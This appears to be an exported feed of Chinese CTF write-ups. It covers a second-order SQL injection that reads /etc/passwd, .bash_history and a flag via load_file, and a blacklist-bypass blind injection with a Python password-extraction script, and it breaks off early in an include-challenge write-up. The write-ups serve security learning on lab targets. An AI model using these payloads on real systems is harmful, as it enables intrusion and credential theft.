class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><code class="hljs perl">&lt;?php<br>// 包含名为 mysql.php 的文件，该文件可能包含了数据库连接相关的代码<br>include <span class="hljs-string">&quot;mysql.php&quot;</span>;<br><br><span class="hljs-regexp">//</span> 启动会话，用于存储和获取用户的会话信息<br>session_start();<br><br><span class="hljs-regexp">//</span> 检查会话中的 <span class="hljs-string">&#x27;login&#x27;</span> 变量是否不等于 <span class="hljs-string">&#x27;yes&#x27;</span>，如果不等于则表示用户未登录<br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;login&#x27;</span>] != <span class="hljs-string">&#x27;yes&#x27;</span>)&#123;<br>    <span class="hljs-regexp">//</span> 若未登录，使用 header 函数将用户重定向到登录页面 login.php<br>    header(<span class="hljs-string">&quot;Location: ./login.php&quot;</span>);<br>    <span class="hljs-regexp">//</span> 终止当前脚本的执行，防止后续代码继续运行<br>    <span class="hljs-keyword">die</span>();<br>&#125;<br><br>// 检查是否通过 GET 请求传递了 <span class="hljs-string">&#x27;do&#x27;</span> 参数<br><span class="hljs-keyword">if</span>(isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>]))&#123;<br>    <span class="hljs-regexp">//</span> 根据 <span class="hljs-string">&#x27;do&#x27;</span> 参数的值进行不同的操作<br>    switch (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;do&#x27;</span>])<br>    &#123;<br>        <span class="hljs-regexp">//</span> 当 <span class="hljs-string">&#x27;do&#x27;</span> 参数的值为 <span class="hljs-string">&#x27;write&#x27;</span> 时<br>        case <span class="hljs-string">&#x27;write&#x27;</span>:<br>            <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;category&#x27;</span> 参数，并使用 addslashes 函数对其进行转义，防止 SQL 注入<br>            <span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>            <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;title&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>            <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>            <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;content&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>            <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>            <span class="hljs-regexp">//</span> 构建插入数据到 <span class="hljs-string">&#x27;board&#x27;</span> 表的 SQL 语句<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br><span class="hljs-string">                    set category = &#x27;<span class="hljs-variable">$category</span>&#x27;,</span><br><span class="hljs-string">                        title = &#x27;<span class="hljs-variable">$title</span>&#x27;,</span><br><span class="hljs-string">                        content = &#x27;<span class="hljs-variable">$content</span>&#x27;&quot;</span>;<br>            <span class="hljs-regexp">//</span> 执行 SQL 语句<br>            <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-regexp">//</span> 将用户重定向到 index.php 页面<br>            header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>            <span class="hljs-regexp">//</span> 跳出 switch 语句<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-regexp">//</span> 当 <span class="hljs-string">&#x27;do&#x27;</span> 参数的值为 <span class="hljs-string">&#x27;comment&#x27;</span> 时<br>        case <span class="hljs-string">&#x27;comment&#x27;</span>:<br>            <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;bo_id&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>            <span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>            <span class="hljs-regexp">//</span> 构建查询 <span class="hljs-string">&#x27;board&#x27;</span> 表中指定 <span class="hljs-string">&#x27;id&#x27;</span> 的 <span class="hljs-string">&#x27;category&#x27;</span> 的 SQL 语句<br>            <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-variable">$bo_id</span>&#x27;&quot;</span>;<br>            <span class="hljs-regexp">//</span> 执行 SQL 语句<br>            <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>            <span class="hljs-regexp">//</span> 获取查询结果的行数<br>            <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-regexp">//</span> 如果查询结果的行数大于 <span class="hljs-number">0</span>，说明存在符合条件的记录<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>                <span class="hljs-regexp">//</span> 获取查询结果中的 <span class="hljs-string">&#x27;category&#x27;</span> 字段值<br>                <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>                <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;content&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>                <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>                <span class="hljs-regexp">//</span> 构建插入数据到 <span class="hljs-string">&#x27;comment&#x27;</span> 表的 SQL 语句<br>                <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">                        set category = &#x27;<span class="hljs-variable">$category</span>&#x27;,</span><br><span class="hljs-string">                            content = &#x27;<span class="hljs-variable">$content</span>&#x27;,</span><br><span class="hljs-string">                            bo_id = &#x27;<span class="hljs-variable">$bo_id</span>&#x27;&quot;</span>;<br>                <span class="hljs-regexp">//</span> 执行 SQL 语句<br>                <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>            &#125;<br>            // 将用户重定向到 comment.php 页面，并传递 <span class="hljs-string">&#x27;id&#x27;</span> 参数<br>            header(<span class="hljs-string">&quot;Location: ./comment.php?id=<span class="hljs-variable">$bo_id</span>&quot;</span>);<br>            <span class="hljs-regexp">//</span> 跳出 switch 语句<br>            <span class="hljs-keyword">break</span>;<br>        <span class="hljs-regexp">//</span> 当 <span class="hljs-string">&#x27;do&#x27;</span> 参数的值为其他值时<br>        default:<br>            <span class="hljs-regexp">//</span> 将用户重定向到 index.php 页面<br>            header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>    &#125;<br>&#125;<br>// 如果没有通过 GET 请求传递 <span class="hljs-string">&#x27;do&#x27;</span> 参数<br><span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-regexp">//</span> 将用户重定向到 index.php 页面<br>    header(<span class="hljs-string">&quot;Location: ./index.php&quot;</span>);<br>&#125;<br>?&gt;<br></code></pre></td></tr></table></figure><hr><p>现在寻找注入点，可以看到这里使用addslashes()对我们提交的数据进行了处理。后台对输入的参数通过addslashes()对预定义字符进行转义，加上\，预定义的字符包括单引号，双引号，反斜杠，NULL。但是放到数据库后会把转义符 \ 去掉（进入数据库后是没有反斜杠的），并存入数据库中。</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-variable">$category</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;category&#x27;</span>]);<br>    <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;title&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>    <span class="hljs-variable">$title</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;title&#x27;</span>]);<br>    <span class="hljs-regexp">//</span> 获取 POST 请求中的 <span class="hljs-string">&#x27;content&#x27;</span> 参数，并使用 addslashes 函数对其进行转义<br>    <span class="hljs-variable">$content</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;content&#x27;</span>]);<br>    <span class="hljs-regexp">//</span> 构建插入数据到 <span class="hljs-string">&#x27;board&#x27;</span> 表的 SQL 语句<br>    <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into board</span><br></code></pre></td></tr></table></figure><p>但是在comment中，对于category的值从数据库查询出来没有进行转义，直接拼接到sql insert语句中，这就存在二次注入了</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$bo_id</span> = addslashes(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;bo_id&#x27;</span>]);<br>           <span class="hljs-regexp">//</span> 构建查询 <span class="hljs-string">&#x27;board&#x27;</span> 表中指定 <span class="hljs-string">&#x27;id&#x27;</span> 的 <span class="hljs-string">&#x27;category&#x27;</span> 的 SQL 语句<br>           <span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;select category from board where id=&#x27;<span class="hljs-variable">$bo_id</span>&#x27;&quot;</span>;<br>           <span class="hljs-regexp">//</span> 执行 SQL 语句<br>           <span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br>           <span class="hljs-regexp">//</span> 获取查询结果的行数<br>           <span class="hljs-variable">$num</span> = mysql_num_rows(<span class="hljs-variable">$result</span>);<br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$num</span>&gt;<span class="hljs-number">0</span>)&#123;<br>               <span class="hljs-regexp">//</span> 获取查询结果中的 <span class="hljs-string">&#x27;category&#x27;</span> 字段值<br>               <span class="hljs-variable">$category</span> = mysql_fetch_array(<span class="hljs-variable">$result</span>)[<span class="hljs-string">&#x27;category&#x27;</span>];<br>             <br></code></pre></td></tr></table></figure><p> <strong>都是直接取出没有进行转义，而之前预定义后的反斜杠在存进数据库中后会消失</strong></p><hr><p>然后我们就可以根据下面这个查询语句构建payload：</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-variable">$sql</span> = <span class="hljs-string">&quot;insert into comment</span><br><span class="hljs-string">        set category = &#x27;<span class="hljs-variable">$category</span>&#x27;,</span><br><span class="hljs-string">            content = &#x27;<span class="hljs-variable">$content</span>&#x27;,</span><br><span class="hljs-string">            bo_id = &#x27;<span class="hljs-variable">$bo_id</span>&#x27;&quot;</span>;<br><span class="hljs-regexp">//</span> 执行 SQL 语句<br><span class="hljs-variable">$result</span> = mysql_query(<span class="hljs-variable">$sql</span>);<br></code></pre></td></tr></table></figure><p>我们在category里面写入我们的语句，然后提交</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-6.png"></p><p>然后查看提交结果，在留言，也就是content参数，输入<code>*/#</code>，闭合前面（&#x2F;**&#x2F;注释）的本来的content，#用来注释后面的引号</p><p>可以看到content一栏回显出来了数据库名</p><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-7.png"></p><h2 id="sql语句拼接原理："><a href="#sql语句拼接原理：" class="headerlink" title="sql语句拼接原理："></a>sql语句拼接原理：</h2><p>通过&#x2F;**&#x2F;将原来的content语句给闭合掉，并且用#将后面的引号注释掉</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> <span class="hljs-keyword">comment</span><br>            <span class="hljs-keyword">set</span> category = <span class="hljs-string">&#x27;0&#x27;</span>,content=<span class="hljs-keyword">database</span>(),<span class="hljs-comment">/*&#x27;,</span><br><span class="hljs-comment">                content = &#x27;*/</span>#<span class="hljs-string">&#x27;,</span><br><span class="hljs-string">                bo_id = &#x27;</span>$bo_id<span class="hljs-string">&#x27;</span><br></code></pre></td></tr></table></figure><p>现在我们找到了二次注入的点，现在我们可以开始注出我们想要的数据</p><h2 id="读取文件"><a href="#读取文件" class="headerlink" title="读取文件"></a>读取文件</h2><p>使用select load_file(‘文件绝对路径’)来读取文件，这里的路径，我们可以猜想一下，大部分的服务器都是linux系统的，所以我们先以linux系统的文件访问示范一下。</p><p>读&#x2F;etc&#x2F;init.d下的东西，这里有配置文件路径<br>?id&#x3D;1’ union select 1,2,load_file(‘&#x2F;etc&#x2F;init.d&#x2F;httpd’)<br>得到web安装路径<br>?id&#x3D;1’ union select 1,2,load_file(‘&#x2F;etc&#x2F;apache&#x2F;conf&#x2F;httpd.conf’)<br>读取密码文件<br>?id&#x3D;1’ union select 1,2,load_file(‘var&#x2F;www&#x2F;html&#x2F;xxx.com&#x2F;php&#x2F;conn.inc.php’)</p><hr><h3 id="读取-etc-passwd文件"><a href="#读取-etc-passwd文件" class="headerlink" title="读取&#x2F;etc&#x2F;passwd文件"></a><strong>读取&#x2F;etc&#x2F;passwd文件</strong></h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/etc/</span>passwd<span class="hljs-string">&#x27;))),/*</span><br></code></pre></td></tr></table></figure><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-8.png"></p><h3 id="查看www用户的历史执行命令"><a href="#查看www用户的历史执行命令" class="headerlink" title="查看www用户的历史执行命令"></a>查看www用户的历史执行命令</h3><p>读取成功，可以知道www用户（一般和网站操作相关的用户，由中间件创建）的目录是&#x2F;home&#x2F;www，可以查询这下面的.bash_history</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select (load_file(&#x27;</span><span class="hljs-regexp">/home/</span>www<span class="hljs-regexp">/.bash_history&#x27;))),/</span>*<br></code></pre></td></tr></table></figure><p><img src="/../image/%E7%BD%91%E9%BC%8E%E6%9D%AF2018-Comment-9.png"></p><p>这里可以看见，www用户进入到tmp目录下，解压了一个html的压缩文件，然后删除了压缩包，将解压了的文件拷贝到了&#x2F;var&#x2F;www&#x2F;html目录下，然后删除了.DS_Store，值得注意的是，他并没有删除&#x2F;tmp目录下解压出来的.DS_Store文件，所以我们就可以查看</p><hr><p>.DS_Store(英文全称 Desktop Services Store)是一种由苹果公司的Mac OS X操作系统所创造的隐藏文件，<strong>目的在于存贮目录的自定义属性</strong>，例如文件们的图标位置或者是背景色的选择。<strong>通过.DS_Store可以知道这个目录里面所有文件的清单。</strong></p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;, content=(select (load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*<br></code></pre></td></tr></table></figure><h3 id="查看文件清单-DS-Store"><a href="#查看文件清单-DS-Store" class="headerlink" title="查看文件清单.DS_Store"></a>查看文件清单.DS_Store</h3><p>这儿由于文件太大，不能完全显示，所以我们用十六进制编码，然后找个网站解码就行了。改为payload：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;, content=(select hex(load_file(&#x27;</span><span class="hljs-regexp">/tmp/</span>html<span class="hljs-regexp">/.DS_Store&#x27;))),/</span>*<br></code></pre></td></tr></table></figure><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns"><span class="hljs-number">00000001427564310000100000000800000010000000040</spanspan class="hljs-number">00000000000</span><br></code></pre></td></tr></table></figure><p>在hackbar中进行十六进制解码，然后放在txt文件中看的更清楚</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">Bud1<br>strapIlbootstrapIlocblobF(ÿÿÿÿÿÿcomment.phpIlocblobÌ(ÿÿcssIlocblobR(ÿÿÿÿÿÿflag_8946e1ff1ee3e40f.phpIlocblobØ(ÿÿÿÿÿÿfontsIlocblobFÿÿÿÿÿÿindex.phpIlocblobÌÿÿjsIlocblobRÿÿÿÿÿÿlogin.phpIlocblobØÿÿÿÿÿÿmysql.phpIlocblobFÿÿÿÿÿÿvendorIlocblobÌÿÿÿÿÿÿwrite_do.phpIlocblobRÿÿÿÿÿÿ <span class="hljs-meta">@</span> <span class="hljs-meta">@</span> <span class="hljs-meta">@</span> <span class="hljs-meta">@</span>E<br>DSDB ` <span class="hljs-meta">@</span> <span class="hljs-meta">@</span> @<br></code></pre></td></tr></table></figure><p>可以看见含有flag的php文件了。</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">flag_8946e1ff1ee3e40f.php<br></code></pre></td></tr></table></figure><h3 id="读取flag文件"><a href="#读取flag文件" class="headerlink" title="读取flag文件"></a>读取flag文件</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">a<span class="hljs-string">&#x27;,content=(select hex(load_file(&#x27;</span><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>flag_8946e1ff1ee3e40f.php<span class="hljs-string">&#x27;))),/*</span><br></code></pre></td></tr></table></figure><p>成功读取</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">3C3F7068700A0924666C61673D22666C61677B36346662393430322D326431612D346436652D386639392D6636393132663331313065647D223B0A3F3E0A<br></code></pre></td></tr></table></figure><p>解码之后就能看到flag了</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-variable">$flag</span>=<span class="hljs-string">&quot;flag&#123;64fb9402-2d1a-4d6e-8f99-f6912f3110ed&#125;&quot;</span>;<br><span class="hljs-meta">?&gt;</span><br><br></code></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> 二次注入 </tag>
            
            <tag> burpsuite爆破密码 </tag>
            
            <tag> git文件泄露与复原 </tag>
            
            <tag> githacker </tag>
            
            <tag> select load_file读取文件 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NCTF2019-SQLi1</title>
      <link href="/2025/04/07/NCTF2019-SQLi1/"/>
      <url>/2025/04/07/NCTF2019-SQLi1/</url>
      
        <content type="html"><![CDATA[<h1 id="NCTF2019-SQLi1"><a href="#NCTF2019-SQLi1" class="headerlink" title="NCTF2019-SQLi1"></a>NCTF2019-SQLi1</h1><p>启动靶机访问页面。</p><p><img src="/../image/NCTF2019-SQLi1-1.png"></p><p>可以看到提示我们了登录界面的sql查询语句</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">sqlquery : select * <span class="hljs-keyword">from</span><span class="hljs-built_in"> users </span>where <span class="hljs-attribute">username</span>=<span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-attribute">passwd</span>=<span class="hljs-string">&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><p>然后访问url&#x2F;robots.txt，提示我们访问&#x2F;hint.txt</p><p>发现提示信息和过滤的一堆关键字</p><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs swift"><span class="hljs-variable">$black_list</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|<span class="hljs-subst">\&#x27;</span>|=| |in|&lt;|&gt;|-|\.|<span class="hljs-subst">\(\)</span>|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;</span>;<br><br><br><span class="hljs-type">If</span> <span class="hljs-variable">$_POST</span>[&#x27;passwd&#x27;] <span class="hljs-operator">===</span> admin&#x27;s password,<br><br><span class="hljs-type">Then</span> you will <span class="hljs-keyword">get</span> the flag;<br></code></pre></td></tr></table></figure><p>这里有个提示信息，如果passwd的值等于admin的密码则登录成功，但是admin被过滤了，这里可以采用正则表达式来获取密码的值，确定获取密码的方式后确定注入点，我们可以对username中的第二个字符进行转义，使后面的’ and passwd&#x3D;’成为username的内容。然后最后用%00代替#和–截断</p><p>sql语句就变成了</p><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs csharp"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;\&#x27; and passwd=&#x27;</span>||passwd<span class="hljs-comment">/**/</span>regexp<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;^yo&quot;</span>;%<span class="hljs-number">00&#x27;</span><br>最后的单引号被截断了，可简化为<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;\&#x27; and passwd=&#x27;</span>||passwd<span class="hljs-comment">/**/</span>regexp<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;^yo&quot;</span><br>同<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> username=<span class="hljs-string">&#x27;\&#x27; and passwd=&#x27;</span> || passwd<span class="hljs-comment">/**/</span>regexp<span class="hljs-comment">/**/</span><span class="hljs-string">&quot;yo&quot;</span><br></code></pre></td></tr></table></figure><p>只要passwd能匹配，where条件查询就为真</p><p>先试试</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=\&amp;passwd=||<span class="hljs-number">1</span><span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><p>发现如果查询成功存在回显。</p><p><img src="/../image/NCTF2019-SQLi1-2.png"></p><p>这里响应包里会有一个</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs avrasm"><span class="hljs-symbol">location:</span> welcome.php<br></code></pre></td></tr></table></figure><p>再试试</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">username</span>=\&amp;passwd=||<span class="hljs-number">0</span><span class="hljs-comment">;%00</span><br></code></pre></td></tr></table></figure><p>发现location: welcome.php没了，证明存在布尔盲注</p><p>这时我们就可以写python脚本了，通过regexp正则表达式盲注出密码</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs processing">from urllib <span class="hljs-keyword">import</span> parse<br><br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><br><br>url = <span class="hljs-string">&#x27;http://2869a871-6f5d-4096-93f5-188f1b7be77b.node5.buuoj.cn:81&#x27;</span><br><span class="hljs-built_in">str</span> = <span class="hljs-string">&#x27;abcdefghijklmnopqrstuvwxyz1234567890_&#123;&#125;-~ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span><br>result = <span class="hljs-string">&#x27;&#x27;</span><br><span class="hljs-keyword">for</span> i in <span class="hljs-title function_">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">200</span>):<br>    <span class="hljs-keyword">for</span> <span class="hljs-type">char</span> in <span class="hljs-built_in">str</span>:<br>        data = &#123;<br>            <span class="hljs-string">&#x27;username&#x27;</span>:<span class="hljs-string">&#x27;\\&#x27;</span>,<br>            <span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/\&quot;^&#x27;</span>+result+<span class="hljs-type">char</span>+<span class="hljs-string">&#x27;\&quot;;&#x27;</span>+parse.<span class="hljs-property">unquote</span>(<span class="hljs-string">&#x27;%00&#x27;</span>) <br>            #也可以这样<span class="hljs-string">&#x27;passwd&#x27;</span>:<span class="hljs-string">&#x27;||/**/passwd/**/regexp/**/\&quot;^&#x27;</span>+result+<span class="hljs-type">char</span>+<span class="hljs-string">&#x27;\&quot;;\x00&#x27;</span><br>        &#125;<br>        r = requests.<span class="hljs-property">post</span>(url, data=data)<br>        time.<span class="hljs-property">sleep</span>(<span class="hljs-number">0.01</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;welcome&#x27;</span> in r.<span class="hljs-property">text</span>:<br>            result += <span class="hljs-type">char</span><br>            <span class="hljs-built_in">print</span>(result)<br>            <span class="hljs-keyword">break</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><p>注意这里的%00必须用parse.unquote(‘%00’) 解释为NULL才能起截断作用，或者使用<code>\x00</code>（或者说 NULL 字符，十六进制表示的 0x00）</p><p>爆出密码</p><figure class="highlight dns"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dns">you_will_never_know<span class="hljs-number">7788990</span><br></code></pre></td></tr></table></figure><p>获取到admin的密码后，随便输入一个用户名并使用这个密码登录即可拿到flag。</p><p><img src="/../image/NCTF2019-SQLi1-3.png"></p>]]></content>
      
      
      
        <tags>
            
            <tag> 布尔盲注 </tag>
            
            <tag> ;%00截断代替#和- </tag>
            
            <tag> regexp注入 </tag>
            
            <tag> &#92;转义单引号 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NPUCTF2020-ezinclude</title>
      <link href="/2025/04/06/NPUCTF2020-ezinclude/"/>
      <url>/2025/04/06/NPUCTF2020-ezinclude/</url>
      
        <content type="html"><![CDATA[<h1 id="NPUCTF2020-ezinclude"><a href="#NPUCTF2020-ezinclude" class="headerlink" title="NPUCTF2020-ezinclude"></a>NPUCTF2020-ezinclude</h1><p>首先启动靶机并访问页面。</p><p>-<img src="/../image/NPUCTF2020-ezinclude-1.png"></p><p>查看网页源码发现提示</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-comment">&lt;!--md5($secret.$name)===$pass --&gt;</span><br></code></pre></td></tr></table></figure><p>抓包看看</p><p>-<img src="/../image/NPUCTF2020-ezinclude-2.png"></p><p>推测这里的hash&#x3D;fa25e54758d5d5c1927781a6ede89f8a即为md5($secret,$name)</p><p>我们不传入name或者传入空值，使hash&#x3D;md5($secret)，再传入?pass&#x3D;fa25e54758d5d5c1927781a6ede89f8a，即可绕过</p><p><img src="/../image/NPUCTF2020-ezinclude-3.png"></p><p>提示我们访问flflflflag.php</p><p><img src="/../image/NPUCTF2020-ezinclude-4.png"></p><p>发现include函数，并且与file传参有关，我们用伪协议去读取一下源码看看</p><figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span></span><br><span class="language-xml"><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">language</span>=<span class="hljs-string">&quot;javascript&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;text/javascript&quot;</span>&gt;</span><span class="language-javascript"></span></span><br><span class="language-javascript"><span class="language-xml">           